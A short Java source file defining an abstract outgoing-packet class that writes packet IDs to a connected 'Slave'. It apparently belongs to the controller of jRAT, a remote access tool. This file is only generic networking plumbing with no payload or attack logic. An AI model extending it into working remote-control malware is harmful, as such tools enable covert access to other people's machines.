package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.PacketRange;
import se.jrat.controller.Slave;
import se.jrat.controller.addons.PluginEventHandler;


public abstract class AbstractOutgoingPacket {

	public abstract void write(Slave slave, DataOutputStream dos) throws Exception;

	public abstract byte getPacketId();

	public synchronized final void send(Slave slave, DataOutputStream dos) {
		try {
			byte id = getPacketId();

			if (id < 0 || id > PacketRange.RANGE_OUTGOING) {
				PluginEventHandler.onSendPacket(id, slave);
			}

			dos.writeByte(getPacketId());
			this.write(slave, dos);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
